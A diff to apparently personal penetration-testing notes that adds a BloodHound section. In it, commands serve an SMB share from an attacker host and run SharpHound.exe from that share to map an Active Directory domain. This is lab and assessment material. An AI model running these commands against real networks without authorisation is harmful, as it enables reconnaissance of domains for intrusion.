@@ -1,8 +1,15 @@
 # Active Directory
 
-
-
 ## Bloodhound
+
+```
+impacket-smbserver share . -smb2support -username df -password df
+net use \\10.10.14.9\share /u:df df
+cd \\10.10.14.9\share\
+.\SharpHound.exe
+```
+
+## Bloodhound-Python
 
 {% embed url="https://github.com/fox-it/BloodHound.py" %}
 
